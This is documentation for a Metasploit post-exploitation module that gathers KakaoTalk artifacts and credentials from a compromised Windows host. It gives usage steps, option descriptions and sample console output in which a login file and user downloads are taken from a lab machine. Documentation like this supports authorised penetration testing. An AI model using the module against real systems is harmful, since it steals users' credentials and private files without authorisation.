## Module Description

This post-exploitation module gathers artifacts found on KakaoTalk related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/kakaotalk
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/kakaotalk) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Kakao's parent folder found
[*] Kakao's Login_list.dat file found
[*] Downloading C:\Users\IEUser\AppData\Local\Kakao\KakaoTalk\users\login_list.dat
[*] Kakao Login_list.dat downloaded
[+] File saved to:  /root/.msf4/loot/20210513053411_default_192.168.56.106_Kakaologin_list._899884.dat

[+] login_list|**********@gmail.com
[+] File with credentials saved:  /root/.msf4/loot/20210513053412_default_192.168.56.106_EXTRACTIONlogin__547610.dat
[*] Kakao's parent folder found
[*] Kakao's * file found
[*] Downloading C:\Users\IEUser\Documents\KakaoTalk Downloads\AppleEvent.pages
[*] Kakao Appleevent.pages downloaded
[+] File saved to:  /root/.msf4/loot/20210513053412_default_192.168.56.106_KakaoAppleEvent._605437.bin

[*] PackRat credential sweep Completed
[*] Post module execution completed
  ```

### Verbose Output
  ```
msf6 post(windows/gather/kakaotalk) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Starting Packrat...
[*] Kakao's parent folder found
[*] Kakao's Login_list.dat file found
[*] Processing C:\Users\IEUser\AppData\Local\Kakao\KakaoTalk\users
[*] Downloading C:\Users\IEUser\AppData\Local\Kakao\KakaoTalk\users\login_list.dat
[*] Kakao Login_list.dat downloaded
[+] File saved to:  /root/.msf4/loot/20210513053709_default_192.168.56.106_Kakaologin_list._746567.dat

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] login_list|**********@gmail.com
[+] File with credentials saved:  /root/.msf4/loot/20210513053709_default_192.168.56.106_EXTRACTIONlogin__448569.dat
[*] Kakao's parent folder found
[*] Kakao's * file found
[*] Processing C:\Users\IEUser\Documents\KakaoTalk Downloads
[*] Downloading C:\Users\IEUser\Documents\KakaoTalk Downloads\AppleEvent.pages
[*] Kakao Appleevent.pages downloaded
[+] File saved to:  /root/.msf4/loot/20210513053709_default_192.168.56.106_KakaoAppleEvent._975441.bin

[-] This artifact does not support any extraction type
[*] PackRat credential sweep Completed
[*] Post module execution completed

```

